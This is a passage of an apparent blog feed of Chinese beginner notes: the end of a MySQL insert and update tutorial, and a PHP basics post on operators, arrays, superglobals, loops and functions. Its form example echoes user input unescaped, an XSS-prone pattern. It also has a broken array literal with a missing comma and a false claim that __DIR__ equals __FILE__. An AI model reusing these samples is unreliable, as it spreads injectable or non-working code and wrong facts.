)</span><br><span class="line">                       VALUES</span><br><span class="line">                       ( value1, value2,...valueN );</span><br></pre></td></tr></table></figure><p>将现有表数据添加到一个已有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into &lt;已有的新表&gt; (列名) select &lt;原表列名&gt; from &lt;原表名&gt;</span><br></pre></td></tr></table></figure><p>直接拿现有表数据创建一个新表并填充</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &lt;新建表列名&gt; into &lt;新建表名&gt; from &lt;源表名&gt;</span><br></pre></td></tr></table></figure><h4 id="命令提示窗口"><a href="#命令提示窗口" class="headerlink" title="命令提示窗口"></a>命令提示窗口</h4><p>实例:</p><p>如果数据是字符型，必须使用单引号或者双引号，如：”福州”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; INSERT INTO blackpink_tbl </span><br><span class="line">       (blackpink_title, blackpink_author, submission_date)</span><br><span class="line">       VALUES</span><br><span class="line">       (&quot;大学&quot;, &quot;福州&quot;, NOW());</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO blackpink_tbl</span><br><span class="line">       (blackpink_title, blackpink_author, submission_date)</span><br><span class="line">       VALUES</span><br><span class="line">       (&quot;中学&quot;, &quot;漳州&quot;, &#39;2014-09-01&#39;);</span><br><span class="line">Query OK, 1 rows affected, 1 warnings (0.01 sec)</span><br><span class="line">mysql&gt; INSERT INTO blackpink_tbl</span><br><span class="line">       (blackpink_title, blackpink_author, submission_date)</span><br><span class="line">       VALUES</span><br><span class="line">       (&quot;小学&quot;, &quot;江都&quot;, &#39;2008-09-01&#39;);</span><br><span class="line">Query OK, 1 rows affected (0.00 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p>读取数据表：select * from blackpink_tbl;</p><p>结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+--------------+-----------------+------------------+-----------------+</span><br><span class="line">| blackpink_id | blackpink_title | blackpink_author | submission_date |</span><br><span class="line">+--------------+-----------------+------------------+-----------------+</span><br><span class="line">|            1 | 大学            | 福州             | 2020-10-17      |</span><br><span class="line">|            2 | 中学            | 漳州             | 2014-09-01      |</span><br><span class="line">|            3 | 小学            | 江都             | 2008-09-01      |</span><br><span class="line">+--------------+-----------------+------------------+-----------------+</span><br></pre></td></tr></table></figure><p>同样也可使用PHP脚本插入数据。</p><h2 id="MySQL改数据"><a href="#MySQL改数据" class="headerlink" title="MySQL改数据"></a>MySQL改数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update &lt;表名&gt; set &lt;列名&#x3D;更新值&gt; [where &lt;更新条件&gt;]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php(二)</title>
    <link href="/2020/10/14/php%20(%E4%BA%8C)/"/>
    <url>/2020/10/14/php%20(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<h1 id="php-二"><a href="#php-二" class="headerlink" title="php (二)"></a>php (二)</h1><ul><li><a href="#php-%E4%BA%8C">php (二)</a><ul><li><a href="#php-%E8%BF%90%E7%AE%97%E7%AC%A6">PHP 运算符</a><ul><li><a href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6">算术运算符:</a></li><li><a href="#%E9%80%92%E5%A2%9E%E9%80%92%E5%87%8F%E8%BF%90%E7%AE%97%E7%AC%A6">递增/递减运算符：</a></li><li><a href="#%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6">比较运算符：</a></li><li><a href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6">逻辑运算符:</a></li><li><a href="#%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6">三元运算符:</a></li><li><a href="#%E7%BB%84%E5%90%88%E6%AF%94%E8%BE%83%E7%AC%A6php7">组合比较符(PHP7+):</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">运算符优先级:</a></li></ul></li><li><a href="#php%E8%AF%AD%E5%8F%A5">PHP语句</a><ul><li><a href="#if-%E8%AF%AD%E5%8F%A5">if 语句：</a></li><li><a href="#php---ifelse-%E8%AF%AD%E5%8F%A5">PHP - if…else 语句:</a></li><li><a href="#php---ifelseifelse-%E8%AF%AD%E5%8F%A5">PHP - if…elseif….else 语句:</a></li><li><a href="#switch-%E8%AF%AD%E5%8F%A5">Switch 语句：</a></li></ul></li><li><a href="#php-%E6%95%B0%E7%BB%84array">PHP 数组array()</a><ul><li><a href="#count-%E5%87%BD%E6%95%B0">count() 函数:</a></li><li><a href="#php-%E6%95%B0%E5%80%BC%E6%95%B0%E7%BB%84">PHP 数值数组：</a></li><li><a href="#%E9%81%8D%E5%8E%86%E6%95%B0%E5%80%BC%E6%95%B0%E7%BB%84">遍历数值数组:</a></li><li><a href="#%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84">关联数组:</a></li></ul></li><li><a href="#php-%E6%95%B0%E7%BB%84%E6%8E%92%E5%BA%8F">PHP 数组排序</a></li><li><a href="#php-%E8%B6%85%E7%BA%A7%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">PHP 超级全局变量</a><ul><li><a href="#globals">$GLOBALS</a></li><li><a href="#_server">$_SERVER</a></li><li><a href="#_request">$_REQUEST</a></li><li><a href="#_post">$_POST</a></li><li><a href="#_get">$_GET</a></li></ul></li><li><a href="#php-%E5%BE%AA%E7%8E%AF">PHP 循环</a><ul><li><a href="#while">while</a></li><li><a href="#dowhile-%E8%AF%AD%E5%8F%A5">do…while 语句</a></li><li><a href="#for-%E5%BE%AA%E7%8E%AF">for 循环</a></li><li><a href="#foreach-%E5%BE%AA%E7%8E%AF">foreach 循环</a></li></ul></li><li><a href="#php-%E5%87%BD%E6%95%B0">PHP 函数</a><ul><li><a href="#%E5%88%9B%E5%BB%BA-php-%E5%87%BD%E6%95%B0">创建 PHP 函数</a></li><li><a href="#php-%E5%87%BD%E6%95%B0---%E6%B7%BB%E5%8A%A0%E5%8F%82%E6%95%B0">PHP 函数 - 添加参数</a></li></ul></li><li><a href="#php-%E9%AD%94%E6%9C%AF%E5%B8%B8%E9%87%8F">PHP 魔术常量</a><ul><li><a href="#line"><strong>LINE</strong></a></li><li><a href="#file"><strong>FILE</strong></a></li><li><a href="#dir"><strong>DIR</strong></a></li><li><a href="#function"><strong>FUNCTION</strong></a></li><li><a href="#class"><strong>CLASS</strong></a></li><li><a href="#method"><strong>METHOD</strong></a></li><li><a href="#namespace"><strong>NAMESPACE</strong></a></li></ul></li></ul></li></ul><h2 id="PHP-运算符"><a href="#PHP-运算符" class="headerlink" title="PHP 运算符"></a>PHP 运算符</h2><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符:"></a>算术运算符:</h4><table><thead><tr><th>x + y</th><th>x - y</th><th>x * y</th><th>x / y</th><th>x % y</th><th>- x</th><th align="center">a . b</th></tr></thead><tbody><tr><td>加</td><td>减</td><td>乘</td><td>除</td><td>模（除法的余数）</td><td>取反</td><td align="center">并置</td></tr></tbody></table><p>整除运算符 **intdiv()**，该函数返回值为第一个参数除于第二个参数的值并取整（向下取整）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(intdiv(16, 5));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果为3</p><h4 id="递增-递减运算符："><a href="#递增-递减运算符：" class="headerlink" title="递增/递减运算符："></a>递增/递减运算符：</h4><table><thead><tr><th align="left">运算符</th><th align="left">名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">++ x</td><td align="left">预递增</td><td align="left">x 加 1，然后返回 x</td></tr><tr><td align="left">x ++</td><td align="left">后递增</td><td align="left">返回 x，然后 x 加 1</td></tr><tr><td align="left">– x</td><td align="left">预递减</td><td align="left">x 减 1，然后返回 x</td></tr><tr><td align="left">x –</td><td align="left">后递减</td><td align="left">返回 x，然后 x 减 1</td></tr></tbody></table><h4 id="比较运算符："><a href="#比较运算符：" class="headerlink" title="比较运算符："></a>比较运算符：</h4><table><thead><tr><th>x == y</th><th>x === y</th><th>x !== y</th><th>x&gt;y</th><th>x&lt;y</th><th>x&gt;=y</th><th>x&lt;=y</th><th>x != y,x &lt;&gt; y</th></tr></thead><tbody><tr><td>等于</td><td>绝对等于</td><td>绝对不等于</td><td>大于</td><td>小于</td><td>大于等于</td><td>小于等于</td><td>不等于</td></tr></tbody></table><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符:"></a>逻辑运算符:</h4><table><thead><tr><th align="center">and，&amp;&amp;</th><th>or,||</th><th>xor</th><th>!x</th></tr></thead><tbody><tr><td align="center">与</td><td>或</td><td>异或</td><td>非</td></tr></tbody></table><h4 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符:"></a>三元运算符:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(expr1) ? (expr2) : (expr3) </span><br></pre></td></tr></table></figure><p>对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。</p><h4 id="组合比较符-PHP7"><a href="#组合比较符-PHP7" class="headerlink" title="组合比较符(PHP7+):"></a>组合比较符(PHP7+):</h4><p>组合比较符（combined comparison operator）也称为太空船操作符，符号为 **&lt;=&gt;**。组合比较运算符可以轻松实现两个变量的比较，也不仅限于数值类数据的比较。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c &#x3D; $a &lt;&#x3D;&gt; $b;</span><br></pre></td></tr></table></figure><ul><li>如果 <strong>$a &gt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>1</strong>。</li><li>如果 <strong>$a == $b</strong>, 则 <strong>$c</strong> 的值为 <strong>0</strong>。</li><li>如果 <strong>$a &lt; $b</strong>, 则 <strong>$c</strong> 的值为 <strong>-1</strong>。</li></ul><h4 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级:"></a>运算符优先级:</h4><p>运算符的优先级口诀：括（号）、单（操作数）、算（术）、移（位）、关（系）；位（运算符）、逻（辑）、条（件）、赋（值）、逗（号）。or 和 ||，&amp;&amp; 和 and 都是逻辑运算符，效果一样，但是其优先级却不一样。我们<strong>通过括号的配对来明确标明运算顺序，而非靠运算符优先级和结合性来决定，通常能够增加代码的可读性。</strong></p><h2 id="PHP语句"><a href="#PHP语句" class="headerlink" title="PHP语句"></a>PHP语句</h2><h4 id="if-语句："><a href="#if-语句：" class="headerlink" title="if 语句："></a>if 语句：</h4><p>if 语句用于<strong>仅当指定条件成立时执行代码</strong>。</p><h4 id="PHP-if…else-语句"><a href="#PHP-if…else-语句" class="headerlink" title="PHP - if…else 语句:"></a>PHP - if…else 语句:</h4><p>在条件成立时执行一块代码，条件不成立时执行另一块代码。</p><h4 id="PHP-if…elseif…-else-语句"><a href="#PHP-if…elseif…-else-语句" class="headerlink" title="PHP - if…elseif….else 语句:"></a>PHP - if…elseif….else 语句:</h4><p>在若干条件之一成立时执行一个代码块。</p><h4 id="Switch-语句："><a href="#Switch-语句：" class="headerlink" title="Switch 语句："></a>Switch 语句：</h4><p>switch 语句用于根据多个不同条件执行不同动作，有选择地执行若干代码块之一。</p><p>工作原理：首先对一个简单的表达式 <em>n</em>（通常是变量）进行一次计算。将表达式的值与结构中每个 case 的值进行比较。如果存在匹配，则执行与 case 关联的代码。代码执行后，使用 <strong>break</strong> 来阻止代码跳入下一个 case 中继续执行。<strong>default</strong> 语句用于不存在匹配（即没有 case 为真）时执行。</p><h2 id="PHP-数组array"><a href="#PHP-数组array" class="headerlink" title="PHP 数组array()"></a>PHP 数组array()</h2><p>数组是一个能在单个变量中存储多个值的特殊变量。</p><ul><li><strong>数值数组</strong> - 带有数字 ID 键的数组</li><li><strong>关联数组</strong> - 带有指定的键的数组，每个键关联一个值</li><li><strong>多维数组</strong> - 包含一个或多个数组的数组</li></ul><h4 id="count-函数"><a href="#count-函数" class="headerlink" title="count() 函数:"></a>count() 函数:</h4><p>count() 函数用于返回数组的长度（元素的数量)。</p><h4 id="PHP-数值数组："><a href="#PHP-数值数组：" class="headerlink" title="PHP 数值数组："></a>PHP 数值数组：</h4><p>这里有两种创建数值数组的方法：</p><p>自动分配 ID 键（ID 键总是从 0 开始）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cars&#x3D;array(&quot;rose&quot;,&quot;lisa&quot;,&quot;jennie&quot;&quot;jisoo&quot;);</span><br></pre></td></tr></table></figure><p>人工分配 ID 键：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cars[0]&#x3D;&quot;rose&quot;;</span><br><span class="line">$cars[1]&#x3D;&quot;lisa&quot;;</span><br><span class="line">$cars[2]&#x3D;&quot;jennie&quot;;</span><br><span class="line">$cars[3]&#x3D;&quot;jisoo&quot;;</span><br></pre></td></tr></table></figure><h4 id="遍历数值数组"><a href="#遍历数值数组" class="headerlink" title="遍历数值数组:"></a>遍历数值数组:</h4><p>遍历并打印数值数组中的所有值，可以使用 for 循环。</p><h4 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组:"></a>关联数组:</h4><p>使用分配给数组的指定的键的数组。</p><p>法一:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$age&#x3D;array(&quot;Jane&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;);</span><br></pre></td></tr></table></figure><p>法二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$age[&#39;Jane&#39;]&#x3D;&quot;35&quot;;</span><br><span class="line">$age[&#39;Ben&#39;]&#x3D;&quot;37&quot;;</span><br><span class="line">$age[&#39;Joe&#39;]&#x3D;&quot;43&quot;;</span><br></pre></td></tr></table></figure><h2 id="PHP-数组排序"><a href="#PHP-数组排序" class="headerlink" title="PHP 数组排序"></a>PHP 数组排序</h2><p>数组中的元素可以按字母或数字顺序进行降序或升序排列。</p><ul><li>sort() - 对数组进行升序排列</li><li>rsort() - 对数组进行降序排列</li><li>asort() - 根据数组的值，对数组进行升序排列</li><li>ksort() - 根据数组的键，对数组进行升序排列</li></ul><h2 id="PHP-超级全局变量"><a href="#PHP-超级全局变量" class="headerlink" title="PHP 超级全局变量"></a>PHP 超级全局变量</h2><p>超级变量在全部作用域中都可用，不需要特别说明。</p><h4 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h4><p>包含了全部变量的全局组合数组</p><h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h4><p>包含了头信息(header)、路径(path)、以及脚本位置(script locations)等信息的数组，数组中的项目由 Web 服务器创建。</p><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h4><p>用于收集HTML表单提交的数据。以下实例显示了一个输入字段（input）及提交按钮(submit)的表单(form)。 当用户通过点击 “Submit” 按钮提交表单数据时, 表单数据将发送至<form>标签中 action 属性中指定的脚本文件。 在这个实例中，我们指定文件来处理表单数据。如果你希望其他的PHP文件来处理该数据，你可以修改该指定的脚本文件名。 然后，我们可以使用超级全局变量 $_REQUEST 来收集表单中的 input 字段数据。</form></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;</span><br><span class="line">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php </span><br><span class="line">$name &#x3D; $_REQUEST[&#39;fname&#39;]; </span><br><span class="line">echo $name; </span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h4><p>用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。(用法与上述$_REQUEST类似)</p><h4 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h4><p>$GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。$_GET 也可以收集URL中发送的数据。</p><h2 id="PHP-循环"><a href="#PHP-循环" class="headerlink" title="PHP 循环"></a>PHP 循环</h2><h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><p> 只要指定的条件成立，则循环执行代码块。</p><p>语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while (条件)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下实例变量 <em>i</em> 的初始值为 9。然后只要 <em>i</em> 小于或者等于 13，while 循环将继续运行。循环每运行一次，<em>i</em> 就会递增 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$i&#x3D;9;</span><br><span class="line">while($i&lt;&#x3D;13)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">The number is 9</span><br><span class="line">The number is 10</span><br><span class="line">The number is 11</span><br><span class="line">The number is 12</span><br><span class="line">The number is 13</span><br></pre></td></tr></table></figure><h4 id="do…while-语句"><a href="#do…while-语句" class="headerlink" title="do…while 语句"></a>do…while 语句</h4><p>do…while 语句执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。</p><p>语法如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">while (条件);</span><br></pre></td></tr></table></figure><h4 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h4><p>for 循环用于预先知道脚本需要运行的次数的情况。</p><p>语法如下：其中的<strong>初始值</strong>和<strong>增量</strong>参数可为空或者有多个表达式（用逗号分隔）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for (初始值; 条件; 增量)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例如下:定义一个初始值为 i=8的循环，只要变量 <strong>i</strong> 小于或者等于 10，循环将继续运行。循环每运行一次，变量 <strong>i</strong> 就会递增 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i&#x3D;8; $i&lt;&#x3D;10; $i++)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;i&#x3D; &quot; . $i . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i&#x3D; 8</span><br><span class="line">i&#x3D; 9</span><br><span class="line">i&#x3D; 10</span><br></pre></td></tr></table></figure><h4 id="foreach-循环"><a href="#foreach-循环" class="headerlink" title="foreach 循环"></a>foreach 循环</h4><p>foreach 循环用于遍历数组。</p><p>语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach ($array as $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach ($array as $key &#x3D;&gt; $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>语法与上面类似，但下面的语法中元素的键与值都会被赋值给 $key 和 $value 变量。</p><h2 id="PHP-函数"><a href="#PHP-函数" class="headerlink" title="PHP 函数"></a>PHP 函数</h2><p>函数是通过调用函数来执行的,可以在页面的任何位置调用函数。</p><h4 id="创建-PHP-函数"><a href="#创建-PHP-函数" class="headerlink" title="创建 PHP 函数"></a>创建 PHP 函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function functionName()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 要执行的代码</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>函数的名称应该提示出它的功能</strong></li><li><strong>函数名称以字母或下划线开头（不能以数字开头）</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function write_song()</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;wonderful u&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo &quot;I want to listen to &quot;;</span><br><span class="line">write_song();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果为 ：I want to listen to wonderful u.</p><h4 id="PHP-函数-添加参数"><a href="#PHP-函数-添加参数" class="headerlink" title="PHP 函数 - 添加参数"></a>PHP 函数 - 添加参数</h4><p>参数类似变量,参数就在函数名称后面的一个括号内指定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function idol($combination,$punctuation)</span><br><span class="line">&#123;</span><br><span class="line">    echo $combination . &quot; blackpink&quot; . $punctuation . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo &quot;My first idol is &quot;;</span><br><span class="line">idol(&quot;rose&quot;,&quot;.&quot;);</span><br><span class="line">echo &quot;My second idol is &quot;;</span><br><span class="line">idol(&quot;lisa&quot;,&quot;!&quot;);</span><br><span class="line">echo &quot;My third idol is &quot;;</span><br><span class="line">idol(&quot;jennie&quot;,&quot;?&quot;);</span><br><span class="line">echo &quot;My forth idol is &quot;;</span><br><span class="line">idol(&quot;jisoo&quot;,&quot;?&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">My first idol is rose blackpink.</span><br><span class="line">My second idol is lisa blackpink!</span><br><span class="line">My third idol is jennie blackpink?</span><br><span class="line">My forth idol is jisoo blackpink?</span><br></pre></td></tr></table></figure><h2 id="PHP-魔术常量"><a href="#PHP-魔术常量" class="headerlink" title="PHP 魔术常量"></a>PHP 魔术常量</h2><p>魔术常量的值随着它们在代码中的位置改变而改变。魔术常量的两边都要加上两个下划线。</p><h4 id="LINE"><a href="#LINE" class="headerlink" title="LINE"></a><strong>LINE</strong></h4><p>文件中的当前行号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;这是第 &quot; &#39;  . __LINE__ . &#39; &quot; 行&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以上实例输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是第 “ 2 ” 行</span><br></pre></td></tr></table></figure><h4 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a><strong>FILE</strong></h4><p>文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。</p><h4 id="DIR"><a href="#DIR" class="headerlink" title="DIR"></a><strong>DIR</strong></h4><p>文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。</p><p>它等价于 __FILE__，如果是根目录，则目录中名包括末尾的斜杠。</p><h4 id="FUNCTION"><a href="#FUNCTION" class="headerlink" title="FUNCTION"></a><strong>FUNCTION</strong></h4><p>返回该函数被定义时的名字（区分大小写）。</p><h4 id="CLASS"><a href="#CLASS" class="headerlink" title="CLASS"></a><strong>CLASS</strong></h4><p>返回该类被定义时的名字（区分大小写），类名包括其被声明的作用区域。</p><h4 id="METHOD"><a href="#METHOD" class="headerlink" title="METHOD"></a><strong>METHOD</strong></h4><p>返回该方法被定义时的名字（区分大小写）。</p><h4 id="NAMESPACE"><a href="#NAMESPACE" class="headerlink" title="NAMESPACE"></a><strong>NAMESPACE</strong></h4><p>当前命名空间的名称（区分大小写），此常量是在编译时定义的。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php(一)</title>
    <link href="/2020/10/10/php%20(%E4%B8%80)/"/>
    <url>/2020/10/10/php%20(%E4%B8%80)/</url>
    
